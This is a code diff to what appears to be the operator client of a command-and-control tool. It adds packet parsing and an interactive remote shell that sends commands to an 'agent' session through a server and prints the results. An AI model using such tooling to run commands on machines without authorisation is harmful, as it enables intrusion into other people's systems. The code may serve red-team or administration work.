@@ -29,6 +29,16 @@ def receive_exact(operator_socket, length): # function to receive the data in ch
     return data
 
 
+def receive_packet(operator_socket):
+    header_bytes = receive_exact(operator_socket, 12)
+    message_type, session_id, payload_length = struct.unpack("!III", header_bytes)
+    payload = ""
+    if payload_length > 0:
+        payload_bytes = receive_exact(operator_socket, payload_length)
+        payload = payload_bytes.decode(errors="replace")
+    return message_type, session_id, payload
+
+
 
 def receive_sessions(operator_socket): # deserialize sessionInfo bytes and display total sessions and session ids
     session_count_bytes = receive_exact(operator_socket, 4) # receive total number of sessions present
@@ -68,26 +78,51 @@ def start_shell(session_id): # here session_id is the current_session variable f
     shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         shell_socket.connect((TARGET_IP, TARGET_PORT))
-        # specifying which session should enter the shell mode
-        # shell_start creates a shell and other continues executing commands on that shell and another one exits the shell
+        print(f"{colors.Style.BRIGHT}{colors.Fore.CYAN}[*] Starting interactive shell for session {session_id}{colors.Style.RESET_ALL}")
         packet_bytes = protocol.packet_formation(protocol.MESSAGE_SHELL_START, session_id, "")
         shell_socket.sendall(packet_bytes)
-        print(f"{colors.Style.BRIGHT}{colors.Fore.CYAN}[*]starting shell{colors.Style.RESET_ALL}")
-        print()
+        print(f"{colors.Fore.CYAN}[+] Shell start request sent{colors.Style.RESET_ALL}")
+        print(f"{colors.Fore.CYAN}[*] Waiting for shell output...{colors.Style.RESET_ALL}")
+
+        msg_type, sid, payload = receive_packet(shell_socket)
+        if msg_type == protocol.MESSAGE_ERROR:
+            print(f"{colors.Fore.RED}[!] Shell connection failed: {payload}{colors.Style.RESET_ALL}")
+            return
+        elif msg_type == protocol.MESSAGE_SHELL_ACK:
+            print(f"{colors.Style.BRIGHT}{colors.Fore.GREEN}[+] Shell connected{colors.Style.RESET_ALL}")
+            print()
+        else:
+            print(f"{colors.Fore.YELLOW}[!] Unexpected message received: {msg_type}{colors.Style.RESET_ALL}")
+            return
+
         while True:
-            command = cli.shellPrompt()
-            if command == "back" or command == "exit": # exit shell session
-                print(f"{colors.Fore.CYAN}[*] exiting shell")
+            try:
+                command = cli.shellPrompt()
+            except EOFError:
+                command = "back"
+            if not command.strip():
+                continue
+            if command.strip() in ("back", "exit"):
                 exit_packet = protocol.packet_formation(protocol.MESSAGE_SHELL_EXIT, session_id, "")
-                shell_socket.sendall(exit_packet) # exit shell prompt
+                shell_socket.sendall(exit_packet)
+                msg_type, sid, payload = receive_packet(shell_socket)
+                if payload:
+                    print(f"\n{colors.Style.BRIGHT}{colors.Fore.GREEN}{payload}{colors.Style.RESET_ALL}")
+                else:
+                    print(f"\n{colors.Style.BRIGHT}{colors.Fore.GREEN}[+] Shell closed{colors.Style.RESET_ALL}")
                 break
-            data_packet = protocol.packet_formation(protocol.MESSAGE_SHELL_DATA, session_id, command) # create shell command packet structure
-            shell_socket.sendall(data_packet) # send server shell commands 
-            # below is the response given by the agent relayed by the server
-            # TO DO HERE
-            
-    except OSError as e:
-        print(f"{colors.Fore.RED}[!] shell connection closed")
+
+            data_packet = protocol.packet_formation(protocol.MESSAGE_SHELL_DATA, session_id, command)
+            shell_socket.sendall(data_packet)
+
+            msg_type, sid, payload = receive_packet(shell_socket)
+            if msg_type == protocol.MESSAGE_ERROR:
+                print(f"{colors.Fore.RED}[!] Error: {payload}{colors.Style.RESET_ALL}")
+            else:
+                print(payload)
+
+    except (OSError, ConnectionError) as e:
+        print(f"{colors.Fore.RED}[!] shell connection closed: {e}{colors.Style.RESET_ALL}")
     finally:
         shell_socket.close()
 
